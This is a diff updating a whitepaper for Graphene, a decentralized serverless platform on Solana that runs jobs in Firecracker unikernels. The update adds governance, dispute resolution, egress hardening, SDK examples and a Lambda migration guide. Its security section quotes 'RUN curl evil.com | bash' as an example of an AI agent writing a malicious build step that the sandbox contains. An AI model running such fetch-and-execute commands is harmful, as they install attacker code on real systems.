@@ -2,7 +2,7 @@
 
 **A Zero-Latency Decentralized Serverless Platform**
 
-Version 5.0
+Version 6.0
 February 2026
 
 ---
@@ -62,7 +62,22 @@ Graphene decouples **work** from **settlement**:
 
 ---
 
-## 3. Architecture
+## 3. Comparison
+
+| Feature | AWS Lambda | Akash | Graphene |
+|---------|------------|-------|-------|
+| Cold Start | 100-500ms | 30-120s | 200-500ms |
+| Isolation | Container | Container | MicroVM + Unikernel |
+| Payment | Credit Card | $AKT | USDC / $GRAPHENE |
+| Latency | Centralized | On-chain | Off-chain |
+| Permissionless | No | Yes | Yes |
+| AI Agent Shell Access | Yes (risky) | Yes (risky) | **No (safe)** |
+| Runtime Package Install | Yes | Yes | No (build-time only) |
+| Network Egress | Unrestricted | Unrestricted | Allowlist only |
+
+---
+
+## 4. Architecture
 
 The Graphene stack consists of four layers, all implemented in Rust.
 
@@ -99,7 +114,7 @@ The Graphene stack consists of four layers, all implemented in Rust.
 └─────────────────────────────────────────────────────────┘
 ```
 
-### 3.1 Layer 1: Settlement Plane (Solana)
+### 4.1 Layer 1: Settlement Plane (Solana)
 
 Solana serves as the financial backbone. The Graphene Anchor program handles:
 
@@ -110,7 +125,7 @@ Solana serves as the financial backbone. The Graphene Anchor program handles:
 
 The blockchain is never in the critical path of job execution. Users open a payment channel once, then execute thousands of jobs without touching the chain.
 
-### 3.2 Layer 2: Execution Plane (Firecracker + Unikraft)
+### 4.2 Layer 2: Execution Plane (Firecracker + Unikraft)
 
 Jobs run in Firecracker MicroVMs containing Unikraft unikernels. This provides:
 
@@ -130,6 +145,17 @@ Users submit standard Dockerfiles. The network compiles them into minimal uniker
 
 The Ephemeral Builder has zero access to host keys, files, or network—preventing `RUN` command exploits.
 
+#### Build Resource Limits
+
+| Resource | Limit |
+|----------|-------|
+| Build timeout | 5 minutes |
+| Build memory | 4 GB |
+| Build disk | 10 GB |
+| Max Dockerfile layers | 50 |
+
+Builds exceeding these limits are terminated with exit code 202 (build failure). User receives 50% refund per the fee schedule.
+
 #### Content-Addressable Caching
 
 Every artifact is content-addressed:
@@ -148,7 +174,7 @@ cache_key = hash(kernel_version + requirements_hash + code_hash)
 
 For popular stacks (Python + Pandas, Node + Express), cold start approaches the theoretical minimum: ~125ms Firecracker boot overhead.
 
-### 3.3 Layer 3: Data Plane (Iroh)
+### 4.3 Layer 3: Data Plane (Iroh)
 
 Iroh provides the peer-to-peer networking layer:
 
@@ -159,7 +185,7 @@ Iroh provides the peer-to-peer networking layer:
 
 Data flows directly between user and worker. The blockchain never sees job payloads.
 
-### 3.4 Layer 4: Economic Plane (Payment Channels)
+### 4.4 Layer 4: Economic Plane (Payment Channels)
 
 Zero-latency payments via unidirectional state channels:
 
@@ -183,9 +209,9 @@ Zero-latency payments via unidirectional state channels:
 
 ---
 
-## 4. Job Lifecycle
+## 5. Job Lifecycle
 
-### 4.1 Phase 1: Channel Setup (One-Time)
+### 5.1 Phase 1: Channel Setup (One-Time)
 
 User opens payment channel with worker (or gateway):
 
@@ -201,7 +227,7 @@ open_channel {
 
 Funds are locked in a PDA. User receives channel ID.
 
-### 4.2 Phase 2: Job Execution (Real-Time Loop)
+### 5.2 Phase 2: Job Execution (Real-Time Loop)
 
 **Step 1: Discovery**
 User queries gossip network for available workers matching requirements:
@@ -246,6 +272,8 @@ Worker validates locally (<5ms):
 - Does channel have sufficient balance?
 - Is nonce higher than last seen?
 
+**Double-Spend Prevention:** Ticket acceptance is first-come-first-served. Workers gossip accepted tickets on a high-priority subchannel. If a worker receives a ticket with nonce N, and later sees another worker accepted the same nonce N, the second acceptance is invalid—but the first worker keeps the payment. Race condition window is ~50-200ms (gossip propagation). Users who double-submit risk losing payment to multiple workers.
+
 **Step 4: Execution**
 Worker assembles and boots MicroVM:
 - Check L2 cache for dependencies (instant if hit)
@@ -268,7 +296,7 @@ Worker creates result blob and notifies user:
 
 User fetches result blob via Iroh. Result is pinned for 24 hours.
 
-### 4.3 Phase 3: Settlement (Asynchronous)
+### 5.3 Phase 3: Settlement (Asynchronous)
 
 After accumulating tickets, worker submits final ticket to Solana:
 
@@ -283,7 +311,9 @@ settle_channel {
 
 Anchor program verifies signature via Ed25519 introspection and transfers funds.
 
-### 4.4 Sequence Diagram: Single Job
+**Cooperative Close:** For immediate settlement, both parties can sign a mutual close message. Funds are returned instantly without the 24-hour dispute window. This is the preferred path for users who want to reclaim unused channel balance quickly.
+
+### 5.4 Sequence Diagram: Single Job
 
 ```
 ┌──────┐          ┌──────┐          ┌────────┐          ┌────────┐
@@ -329,7 +359,7 @@ Anchor program verifies signature via Ed25519 introspection and transfers funds.
    │                 │                  │                   │
 ```
 
-### 4.5 Sequence Diagram: DAG Workflow
+### 5.5 Sequence Diagram: DAG Workflow
 
 ```
 ┌──────┐       ┌────────┐       ┌────────┐       ┌────────┐
@@ -370,7 +400,7 @@ Anchor program verifies signature via Ed25519 introspection and transfers funds.
    │               │               │               │
 ```
 
-### 4.6 Payment Channel State Machine
+### 5.6 Payment Channel State Machine
 
 ```
                               ┌─────────────────┐
@@ -440,7 +470,19 @@ Anchor program verifies signature via Ed25519 introspection and transfers funds.
 | **DISPUTING** | 24h window for worker to submit tickets | → SETTLED (ticket submitted or timeout) |
 | **SETTLED** | Funds distributed, channel closed | → OPEN (reopen with new deposit) |
 
-### 4.7 Job State Machine
+**Dispute Resolution:**
+
+Workers store result hashes on-chain during settlement. If a user disputes non-delivery within the 24-hour window, the worker must provide the result blob matching the committed hash. Resolution:
+
+| Scenario | Outcome |
+|----------|---------|
+| Worker provides valid result blob | User claim rejected, worker keeps payment |
+| Worker cannot provide result | User refunded + 1% of worker stake slashed |
+| Neither party responds | Funds split 50/50 after timeout |
+
+**Note on Computation Correctness:** Disputes cover *delivery*, not *correctness*. Graphene v1 does not guarantee that workers computed results honestly—only that they delivered *something*. Correctness guarantees require TEE attestation (see Roadmap, Phase 4).
+
+### 5.7 Job State Machine
 
 ```
                     ┌───────────────┐
@@ -526,7 +568,7 @@ Anchor program verifies signature via Ed25519 introspection and transfers funds.
 | DELIVERED | terminal | - |
 | EXPIRED | terminal | - |
 
-### 4.8 Workflow State Machine
+### 5.8 Workflow State Machine
 
 ```
                          ┌────────────────┐
@@ -568,9 +610,9 @@ Anchor program verifies signature via Ed25519 introspection and transfers funds.
 
 ---
 
-## 5. Tokenomics
+## 6. Tokenomics
 
-### 5.1 The $GRAPHENE Token
+### 6.1 The $GRAPHENE Token
 
 $GRAPHENE is an SPL token with two primary functions:
 
@@ -589,7 +631,7 @@ Example: 8 vCPU, 32GB RAM node requires 820 $GRAPHENE stake.
 **2. Payment Medium (Optional)**
 Users can pay in USDC or $GRAPHENE. Paying in $GRAPHENE provides a 15% discount, creating organic demand without forcing adoption.
 
-### 5.2 Payment Flow
+### 6.2 Payment Flow
 
 | Actor | Token Requirement |
 |-------|-------------------|
@@ -599,7 +641,7 @@ Users can pay in USDC or $GRAPHENE. Paying in $GRAPHENE provides a 15% discount,
 
 Users never need to hold SOL. Workers absorb gas costs (profitable given job revenue).
 
-### 5.3 Token Supply
+### 6.3 Token Supply
 
 **Max Supply:** 1,000,000,000 $GRAPHENE (1 billion, fixed cap)
 
@@ -614,22 +656,22 @@ Users never need to hold SOL. Workers absorb gas costs (profitable given job rev
 | Liquidity & Exchanges | 10% (100M) | Immediate |
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│                    1B $GRAPHENE                            │
-├──────────────────────┬──────────────────────────────────┤
-│   Community (40%)    │████████████████████              │
-├──────────────────────┼──────────────────────────────────┤
-│   Team (20%)         │██████████                        │
-├──────────────────────┼──────────────────────────────────┤
-│   Investors (15%)    │███████▌                          │
-├──────────────────────┼──────────────────────────────────┤
-│   Treasury (15%)     │███████▌                          │
-├──────────────────────┼──────────────────────────────────┤
-│   Liquidity (10%)    │█████                             │
-└──────────────────────┴──────────────────────────────────┘
+┌────────────────────────────────────────────────────────────┐
+│                      1B $GRAPHENE                          │
+├────────────────────────┬───────────────────────────────────┤
+│   Community (40%)      │████████████████████               │
+├────────────────────────┼───────────────────────────────────┤
+│   Team (20%)           │██████████                         │
+├────────────────────────┼───────────────────────────────────┤
+│   Investors (15%)      │███████▌                           │
+├────────────────────────┼───────────────────────────────────┤
+│   Treasury (15%)       │███████▌                           │
+├────────────────────────┼───────────────────────────────────┤
+│   Liquidity (10%)      │█████                              │
+└────────────────────────┴───────────────────────────────────┘
 ```
 
-### 5.4 Emission Schedule
+### 6.4 Emission Schedule
 
 New tokens enter circulation through **Worker Rewards** — incentivizing early network participation before organic demand develops.
 
@@ -647,7 +689,17 @@ New tokens enter circulation through **Worker Rewards** — incentivizing early 
 
 After year 5, emissions continue at 1% until the 300M cap is reached (~Year 12), then emissions stop entirely. Network sustainability relies on fee revenue.
 
-### 5.5 Staking Economics
+**Bootstrap Phase (Months 1-6):**
+
+| Initiative | Description |
+|------------|-------------|
+| Seed Workers | Foundation operates 10-20 workers to ensure baseline availability |
+| Early Worker Bonus | 2x emission multiplier for first 100 registered workers |
+| Minimum Viable Network | Target 50 workers across 3+ regions before public launch |
+
+The bootstrap phase addresses the cold-start problem inherent to all decentralized compute networks. Seed workers ensure users can execute jobs from day one, while early worker bonuses incentivize organic supply growth.
+
+### 6.5 Staking Economics
 
 Workers stake $GRAPHENE to participate. Staking yield comes from two sources:
 
@@ -688,7 +740,7 @@ Workers stake $GRAPHENE to participate. Staking yield comes from two sources:
 
 *APY varies based on stake participation and network revenue.*
 
-### 5.6 Fee Structure
+### 6.6 Fee Structure
 
 **Job Fees:**
 
@@ -713,7 +765,7 @@ Job Fee (100%)
               └── 20% → Burn (deflationary)
 ```
 
-### 5.7 Token Sinks (Deflationary Pressure)
+### 6.7 Token Sinks (Deflationary Pressure)
 
 Multiple mechanisms reduce circulating supply:
 
@@ -744,7 +796,7 @@ Break-even calculation:
 Network becomes net-deflationary at ~$500M annual job volume.
 ```
 
-### 5.8 Token Flow Diagram
+### 6.8 Token Flow Diagram
 
 ```
                               ┌─────────────┐
@@ -782,7 +834,7 @@ Network becomes net-deflationary at ~$500M annual job volume.
               └──────────────┘
 ```
 
-### 5.9 Economic Scenarios
+### 6.9 Economic Scenarios
 
 **Bear Case (Low Adoption):**
 - Year 3 job volume: $10M
@@ -802,7 +854,7 @@ Network becomes net-deflationary at ~$500M annual job volume.
 - Staking yield: ~18%
 - Outcome: Net deflationary, strong token demand
 
-### 5.10 Worker Economics Example
+### 6.10 Worker Economics Example
 
 **Setup:**
 - Worker stakes 1,000 $GRAPHENE (~$1,000 at $1/token)
@@ -821,11 +873,40 @@ Network becomes net-deflationary at ~$500M annual job volume.
 
 *Workers are incentivized to provide reliable service to maximize job allocation.*
 
+*Note: Economic scenarios assume $GRAPHENE ≈ $1 USD for illustration. Actual returns depend on market price.*
+
+### 6.11 Governance
+
+**Governed Parameters** (changeable via token-weighted voting):
+
+| Parameter | Current Value | Change Process |
+|-----------|---------------|----------------|
+| Protocol fee percentage | 5% (USDC) / 2% ($GRAPHENE) | Governance vote |
+| Slashing percentages | 1% (no response), etc. | Governance vote |
+| Emission schedule | Per Section 6.4 | Governance vote |
+| Approved kernel list | python, node, etc. | Governance vote |
+| Build resource limits | Per Section 4.2 | Governance vote |
+
+**Governance Mechanism:**
+- Token-weighted voting: 1 $GRAPHENE = 1 vote
+- Proposal threshold: 100,000 $GRAPHENE to submit
+- Quorum: 10% of circulating supply
+- Voting period: 7 days
+- Timelock: 48 hours between passage and execution
+
+**Immutable Parameters** (cannot be changed):
+- Maximum supply cap (1 billion)
+- Core payment channel cryptography
+- Unikernel security model (no shell)
+
+**Slashing Appeals:**
+Workers may appeal slashing decisions within 72 hours. Appeals are reviewed by a randomly-selected committee of 5 high-reputation workers. Committee decision is final.
+
 ---
 
-## 6. Pricing
+## 7. Pricing
 
-### 6.1 Worker-Set Pricing
+### 7.1 Worker-Set Pricing
 
 Workers advertise their rates via gossip:
 
@@ -839,7 +920,25 @@ Workers advertise their rates via gossip:
 }
 ```
 
-### 6.2 Job Cost Calculation
+**Price Discovery:**
+
+Workers include network-wide price statistics in gossip announcements:
+
+```json
+{
+  "network_stats": {
+    "median_cpu_ms": 0.0000012,
+    "p25_cpu_ms": 0.0000008,
+    "p75_cpu_ms": 0.0000018,
+    "sample_size": 150,
+    "updated_at": 1706900000
+  }
+}
+```
+
+SDKs use these statistics to warn users when a selected worker charges >2x the network median. This provides market transparency without requiring a centralized price oracle.
+
+### 7.2 Job Cost Calculation
 
 **Maximum cost** (locked when job starts):
 ```
@@ -856,7 +955,7 @@ actual_cost = (vcpu × actual_duration × cpu_rate) +
 
 Unused balance remains in channel for subsequent jobs.
 
-### 6.3 Job Tiers
+### 7.3 Job Tiers
 
 | Tier | Max Duration | Max vCPU | Max Memory | Max Result |
 |------|--------------|----------|------------|------------|
@@ -867,9 +966,9 @@ Workers advertise supported tiers. Compute tier requires higher stake.
 
 ---
 
-## 7. Security
+## 8. Security
 
-### 7.1 The AI Agent Security Problem
+### 8.1 The AI Agent Security Problem
 
 Current "agentic" AI solutions treat the AI like a human user — giving it shell access (`/bin/bash`) inside a container or VM. This is fundamentally broken:
 
@@ -911,7 +1010,7 @@ Current "agentic" AI solutions treat the AI like a human user — giving it shel
 - Lateral movement through network access
 - Data exfiltration via unrestricted egress
 
-### 7.2 The Graphene Solution: Function Sandboxing
+### 8.2 The Graphene Solution: Function Sandboxing
 
 Graphene moves from **"Sandboxing an Environment"** to **"Sandboxing a Function"**.
 
@@ -975,14 +1074,14 @@ The AI agent does not "run" inside a runtime. It *requests* a build, and the sys
 
 **Key insight:** The `RUN pip install` in the Dockerfile executes *inside the ephemeral builder VM*, not on the host. Even if the AI writes malicious RUN commands, they're sandboxed in a disposable VM that has no access to host keys, files, or network.
 
-### 7.3 Agent Architecture: Planner vs Executor
+### 8.3 Agent Architecture: Planner vs Executor
 
 Graphene enforces a strict separation between the **Planner** (AI) and **Executor** (Runtime):
 
 | Layer | Role | Has Shell? | Has Network? | Can Install? |
 |-------|------|------------|--------------|--------------|
 | **Planner (AI)** | Generate Dockerfile + manifest | No | No | No |
-| **Builder VM** | Run BuildKit + Unikraft | Isolated | Mirror only | Build-time only |
+| **Builder VM** | Run BuildKit + Unikraft | Isolated | Package mirrors only (PyPI, npm) | Build-time only |
 | **Executor** | Run sealed .unik binary | No | Allowlist only | No |
 
 **The AI never touches the runtime.** It only produces a Dockerfile that is compiled by an isolated, ephemeral builder VM. The builder VM:
@@ -992,7 +1091,7 @@ Graphene enforces a strict separation between the **Planner** (AI) and **Executo
 
 Even if the AI writes `RUN curl evil.com | bash` in the Dockerfile, that command runs inside the disposable builder — not on the host or production runtime.
 
-### 7.4 Why Unikernels Solve This
+### 8.4 Why Unikernels Solve This
 
 Traditional containers share a kernel with the host and include full OS userland:
 
@@ -1025,7 +1124,7 @@ Container:          Unikernel:
 - **No syscall surface**: Only syscalls needed for the app are compiled in
 - **Hypervisor isolation**: Even kernel exploits don't reach the host
 
-### 7.5 Supply Chain Security
+### 8.5 Supply Chain Security
 
 AI agents often request packages that could be compromised. Graphene mitigates this:
 
@@ -1054,7 +1153,7 @@ build(code + deps + kernel) → deterministic hash
 
 Any tampering is detectable by hash mismatch.
 
-### 7.6 Network Egress Controls
+### 8.6 Network Egress Controls
 
 The manifest specifies an **allowlist** of permitted endpoints:
 
@@ -1075,7 +1174,13 @@ The manifest specifies an **allowlist** of permitted endpoints:
 - No arbitrary outbound connections possible
 - Data exfiltration prevented at the hypervisor level
 
-### 7.7 Comparison: Shell-Based vs Graphene
+**Hardening Details:**
+- DNS resolved once at connection time; IP pinned for session duration (prevents DNS rebinding)
+- Connections to RFC1918/loopback addresses (10.x, 172.16.x, 192.168.x, 127.x) blocked regardless of allowlist
+- TLS certificate chain validated against public roots; self-signed certificates rejected
+- Wildcard patterns (e.g., `*.amazonaws.com`) expanded at build time, not runtime
+
+### 8.7 Comparison: Shell-Based vs Graphene
 
 | Capability | Shell-Based Agent | Graphene Agent |
 |------------|-------------------|-------------|
@@ -1087,7 +1192,7 @@ The manifest specifies an **allowlist** of permitted endpoints:
 | Survive reboot | Yes (persistence) | No (ephemeral) |
 | Attack surface | Full OS userland | Single binary |
 
-### 7.8 Triple-Layer Isolation
+### 8.8 Triple-Layer Isolation
 
 | Layer | Component | Protection |
 |-------|-----------|------------|
@@ -1095,7 +1200,9 @@ The manifest specifies an **allowlist** of permitted endpoints:
 | Storage | Content Addressing | Prevents poisoned image attacks |
 | Runtime | KVM Virtualization | Prevents guest-to-host escape |
 
-### 7.9 Slashing Conditions
+Firecracker's attack surface is approximately 50,000 lines of Rust with minimal unsafe code in the critical path. KVM provides hardware-enforced isolation via Intel VT-x/AMD-V. This is the same security model used by AWS Lambda and Fly.io.
+
+### 8.9 Slashing Conditions
 
 Workers are slashed only for **observable misbehavior**:
 
@@ -1109,11 +1216,26 @@ Workers are slashed only for **observable misbehavior**:
 - Incorrect results (handled by reputation)
 - Data exfiltration (mitigated by network allowlist)
 
-### 7.10 Unbonding Period
+### 8.10 Unbonding Period
 
 Workers requesting stake withdrawal enter a 14-day unbonding period. This prevents "slash and run" attacks and allows time for fraud proofs.
 
-### 7.11 Future: Confidential Compute
+### 8.11 Computation Integrity
+
+Graphene v1 guarantees **delivery** but not **correctness**. A malicious worker could return fabricated results. This is a known limitation shared by all non-TEE decentralized compute networks.
+
+**Mitigations:**
+
+| Strategy | Description |
+|----------|-------------|
+| Reputation | Workers with high failure/dispute rates receive fewer jobs |
+| Redundant Execution | Users can submit identical jobs to N workers and compare results |
+| Deterministic Builds | Content-addressed caching means same inputs → same binary; result divergence indicates dishonesty |
+| TEE Attestation | Phase 4 adds cryptographic proof of correct execution |
+
+For high-value computations requiring correctness guarantees before TEE support, users should employ redundant execution with majority voting.
+
+### 8.12 Future: Confidential Compute
 
 TEE integration (Intel SGX / AMD SEV) planned as premium tier for:
 - Proprietary AI model inference
@@ -1122,9 +1244,9 @@ TEE integration (Intel SGX / AMD SEV) planned as premium tier for:
 
 ---
 
-## 8. Worker Selection
+## 9. Worker Selection
 
-### 8.1 Geographic Routing
+### 9.1 Geographic Routing
 
 Workers announce regions in gossip:
 
@@ -1152,7 +1274,7 @@ Users specify routing preferences:
 2. Sort by preference match, price, reputation
 3. If `max_latency_ms` set, probe top candidates
 
-### 8.2 Reputation System
+### 9.2 Reputation System
 
 Workers build reputation based on:
 - Job success rate
@@ -1164,9 +1286,9 @@ High-reputation workers receive priority in job matching.
 
 ---
 
-## 9. Failure Handling
+## 10. Failure Handling
 
-### 9.1 Exit Codes
+### 10.1 Exit Codes
 
 | Exit Code | Meaning | User Refund | Worker Paid |
 |-----------|---------|-------------|-------------|
@@ -1177,20 +1299,57 @@ High-reputation workers receive priority in job matching.
 | 201 | Worker resource exhausted | 100% | No |
 | 202 | Build failure | 50% | Partial |
 
-### 9.2 Result Delivery
+### 10.2 Result Delivery
 
 Results are stored as Iroh blobs with 24-hour TTL:
 - User offline? Fetch later by hash
 - Large results? Chunked streaming
 - Need webhook? Optional URL in manifest
 
+### 10.3 Logging and Observability
+
+**Job Logs:**
+Jobs can write to stdout/stderr. Output is captured and included in the result blob (max 1MB). For longer output, jobs should write to a file included in the result.
+
+**Structured Errors:**
+Failed jobs return structured error information:
+
+```json
+{
+  "error": {
+    "code": "BUILD_TIMEOUT",
+    "message": "Build exceeded 5 minute limit",
+    "phase": "building",
+    "elapsed_ms": 300000,
+    "exit_code": 202
+  }
+}
+```
+
+| Error Code | Phase | Description |
+|------------|-------|-------------|
+| `TICKET_INVALID` | verification | Payment ticket signature invalid |
+| `CHANNEL_EXHAUSTED` | verification | Insufficient channel balance |
+| `BUILD_TIMEOUT` | building | Build exceeded time limit |
+| `BUILD_OOM` | building | Build exceeded memory limit |
+| `RUNTIME_TIMEOUT` | running | Execution exceeded max_duration_ms |
+| `RUNTIME_OOM` | running | Execution exceeded memory_mb |
+| `EGRESS_BLOCKED` | running | Attempted connection to non-allowlisted host |
+
+**Worker Metrics:**
+Workers expose a Prometheus-compatible `/metrics` endpoint for operators, including:
+- `graphene_jobs_total{status="success|failed|timeout"}`
+- `graphene_job_duration_seconds`
+- `graphene_cache_hits_total{layer="L1|L2|L3"}`
+- `graphene_channel_settlements_total`
+
 ---
 
-## 10. Job Orchestration
+## 11. Job Orchestration
 
 Graphene supports composing multiple jobs into workflows, enabling pipelines, fan-out parallelism, and conditional execution.
 
-### 10.1 Orchestration Modes
+### 11.1 Orchestration Modes
 
 | Mode | Description | Use Case |
 |------|-------------|----------|
@@ -1198,7 +1357,7 @@ Graphene supports composing multiple jobs into workflows, enabling pipelines, fa
 | **DAG** | Pre-declared dependency graph | Known pipelines |
 | **Dynamic** | Jobs spawn children at runtime | Conditional logic |
 
-### 10.2 DAG Mode (Static Workflows)
+### 11.2 DAG Mode (Static Workflows)
 
 When the workflow structure is known upfront, declare it in the manifest:
 
@@ -1250,7 +1409,7 @@ Time 3:                                                 [summarize: done]
 
 The worker pipelines dependency loading with execution, minimizing total latency.
 
-### 10.3 Dynamic Mode (Runtime Spawning)
+### 11.3 Dynamic Mode (Runtime Spawning)
 
 When workflow shape depends on runtime decisions, jobs can spawn children programmatically:
 
@@ -1296,7 +1455,7 @@ results = fan_out(
 
 If any limit is exceeded, spawn fails and parent job receives an error.
 
-### 10.4 Affinity Controls
+### 11.4 Affinity Controls
 
 Control where child jobs execute:
 
@@ -1316,7 +1475,7 @@ Control where child jobs execute:
 - Not limited by single node's resources
 - Better for CPU-bound fan-out
 
-### 10.5 Inter-Job Data Passing
+### 11.5 Inter-Job Data Passing
 
 **Same-worker:** Results passed via shared memory or local filesystem. Zero serialization overhead for large artifacts.
 
@@ -1327,7 +1486,7 @@ Same-worker:     Job A ──[memory]──▶ Job B     (< 1ms)
 Distributed:     Job A ──[iroh blob]──▶ Job B  (network latency)
 ```
 
-### 10.6 Payment for Child Jobs
+### 11.6 Payment for Child Jobs
 
 **Same-worker (shared channel):**
 - All jobs deduct from parent's payment channel
@@ -1354,7 +1513,7 @@ Distributed:     Job A ──[iroh blob]──▶ Job B  (network latency)
          └──────────┘                  └──────────┘
 ```
 
-### 10.7 Failure Handling in Workflows
+### 11.7 Failure Handling in Workflows
 
 | Failure | DAG Mode | Dynamic Mode |
 |---------|----------|--------------|
@@ -1365,7 +1524,7 @@ Distributed:     Job A ──[iroh blob]──▶ Job B  (network latency)
 
 **Partial results:** For fan-out patterns, completed results are returned even if some branches fail. User code handles partial success.
 
-### 10.8 Example: Map-Reduce Pattern
+### 11.8 Example: Map-Reduce Pattern
 
 ```json
 {
@@ -1415,9 +1574,9 @@ Distributed:     Job A ──[iroh blob]──▶ Job B  (network latency)
 
 ---
 
-## 11. Network Topology
+## 12. Network Topology
 
-### 11.1 Discovery
+### 12.1 Discovery
 
 All workers subscribe to `graphene-compute-v1` gossip topic. Announcements include:
 - Node ID (Ed25519 public key)
@@ -1425,21 +1584,21 @@ All workers subscribe to `graphene-compute-v1` gossip topic. Announcements inclu
 - Pricing
 - Current load
 
-### 11.2 Direct Connections
+### 12.2 Direct Connections
 
 After discovery, users connect directly to workers via Magicsock:
 - NAT traversal via UDP hole-punching
 - Fallback to DERP relays
 - Connection identified by public key (not IP)
 
-### 11.3 Global Cache
+### 12.3 Global Cache
 
 Dependency blobs are content-addressed and shared peer-to-peer:
 - Node A builds `pytorch-v2` → announces hash
 - Node B needs same deps → fetches from A (or any seeder)
 - Popular dependencies propagate network-wide
 
-### 11.4 Worker Lifecycle State Machine
+### 12.4 Worker Lifecycle State Machine
 
 ```
                          ┌────────────────┐
@@ -1526,7 +1685,117 @@ Dependency blobs are content-addressed and shared peer-to-peer:
 
 ---
 
-## 12. Roadmap
+## 13. SDK Quick Start
+
+### 13.1 Installation
+
+```bash
+# Python
+pip install graphene-sdk
+
+# TypeScript
+npm install @graphene/sdk
+
+# Rust
+cargo add graphene-sdk
+```
+
+### 13.2 Simple Function Execution
+
+```python
+from graphene import Client
+
+# Connect using local wallet (~/.config/solana/id.json)
+client = Client()
+
+# Execute a simple Python function
+result = client.run(
+    code="""
+def main(data):
+    return {"sum": sum(data["numbers"])}
+""",
+    input={"numbers": [1, 2, 3, 4, 5]},
+    resources={"vcpu": 1, "memory_mb": 512}
+)
+
+print(result.output)  # {"sum": 15}
+print(result.duration_ms)  # 234
+print(result.cost_usdc)  # 0.0001
+```
+
+### 13.3 Dockerfile-Based Jobs
+
+```python
+from graphene import Client, Manifest
+
+client = Client()
+
+# Build and run from Dockerfile
+result = client.run(
+    dockerfile="./Dockerfile",
+    manifest=Manifest(
+        vcpu=2,
+        memory_mb=2048,
+        max_duration_ms=60000,
+        egress=["api.openai.com", "huggingface.co"]
+    ),
+    input_file="data.csv"
+)
+
+# Stream logs while running
+for line in client.logs(result.job_id):
+    print(line)
+
+# Fetch result
+output = result.download("output.json")
+```
+
+### 13.4 Workflow Execution
+
+```python
+from graphene import Client, DAG
+
+client = Client()
+
+# Define a map-reduce workflow
+workflow = DAG()
+workflow.add("fetch", code="fetch.py")
+workflow.add("process", code="process.py", depends_on=["fetch"])
+workflow.add("summarize", code="summarize.py", depends_on=["process"])
+
+# Execute with automatic dependency resolution
+result = client.run_workflow(
+    workflow,
+    entry="fetch",
+    affinity="same_worker"
+)
+
+print(result.jobs["summarize"].output)
+```
+
+### 13.5 TypeScript Example
+
+```typescript
+import { Client } from '@graphene/sdk';
+
+const client = new Client();
+
+const result = await client.run({
+  code: `
+    export function main(input: { x: number }) {
+      return { squared: input.x ** 2 };
+    }
+  `,
+  input: { x: 42 },
+  resources: { vcpu: 1, memoryMb: 512 }
+});
+
+console.log(result.output); // { squared: 1764 }
+```
+
+---
+
+## 14. Roadmap
 
 ### Phase 1: Engine (Q1 2026)
 - Single-node worker binary
@@ -1554,7 +1823,7 @@ Dependency blobs are content-addressed and shared peer-to-peer:
 
 ---
 
-## 13. Technical Stack
+## 15. Technical Stack
 
 | Component | Technology | Purpose |
 |-----------|------------|---------|
@@ -1563,21 +1832,6 @@ Dependency blobs are content-addressed and shared peer-to-peer:
 | Compute | Firecracker | MicroVM runtime |
 | Unikernels | Unikraft + BuildKit | Dockerfile → minimal kernel |
 | Signatures | Ed25519 | Payment tickets, identity |
-
----
-
-## 14. Comparison
-
-| Feature | AWS Lambda | Akash | Graphene |
-|---------|------------|-------|-------|
-| Cold Start | 100-500ms | 30-120s | 200-500ms |
-| Isolation | Container | Container | MicroVM + Unikernel |
-| Payment | Credit Card | $AKT | USDC / $GRAPHENE |
-| Latency | Centralized | On-chain | Off-chain |
-| Permissionless | No | Yes | Yes |
-| AI Agent Shell Access | Yes (risky) | Yes (risky) | **No (safe)** |
-| Runtime Package Install | Yes | Yes | No (build-time only) |
-| Network Egress | Unrestricted | Unrestricted | Allowlist only |
 
 ---
 
@@ -1635,7 +1889,7 @@ Dependency blobs are content-addressed and shared peer-to-peer:
 ```json
 {
   "orchestration": {
-    "mode": "dag | dynamic | single",
+    "mode": "dag",  // or "dynamic" or "single"
 
     "dag": {
       "jobs": {
@@ -1699,6 +1953,59 @@ Dependency blobs are content-addressed and shared peer-to-peer:
     "p99_latency_ms": 450
   }
 }
+```
+
+## Appendix E: Migration from AWS Lambda
+
+| AWS Lambda Concept | Graphene Equivalent |
+|--------------------|---------------------|
+| `handler.py` / handler function | `entrypoint` in manifest |
+| `requirements.txt` | `RUN pip install` in Dockerfile |
+| Event JSON | Input blob (via `input_url`) |
+| Return value | stdout or result blob |
+| Environment variables | Build-time `ARG` in Dockerfile |
+| VPC / Security Groups | `egress_allowlist` in manifest |
+| Layers | Multi-stage Dockerfile + L2 cache |
+| Provisioned Concurrency | Pre-warmed workers (same effect via caching) |
+| Step Functions | DAG orchestration mode |
+| CloudWatch Logs | stdout/stderr in result blob |
+
+**Key Differences:**
+
+1. **No runtime package installation.** All dependencies must be in the Dockerfile. This is more secure but requires upfront declaration.
+
+2. **No persistent filesystem.** Jobs are stateless. Use input/output blobs for data passing.
+
+3. **Explicit network allowlist.** Unlike Lambda VPCs which allow all egress by default, Graphene blocks all egress unless explicitly allowlisted.
+
+4. **Payment model.** Pay-per-use via payment channels instead of AWS billing. No minimum charges or reserved capacity fees.
+
+**Example Migration:**
+
+```python
+# AWS Lambda
+def handler(event, context):
+    import pandas as pd
+    df = pd.read_csv(event['s3_path'])
+    return {"row_count": len(df)}
+
+# Graphene Dockerfile
+FROM python:3.11-slim-unikraft
+RUN pip install pandas
+COPY handler.py /app/
+CMD ["python", "/app/handler.py"]
+
+# Graphene handler.py
+import json
+import pandas as pd
+
+def main():
+    with open("/input/data.csv") as f:
+        df = pd.read_csv(f)
+    print(json.dumps({"row_count": len(df)}))
+
+if __name__ == "__main__":
+    main()
 ```
 
 ---
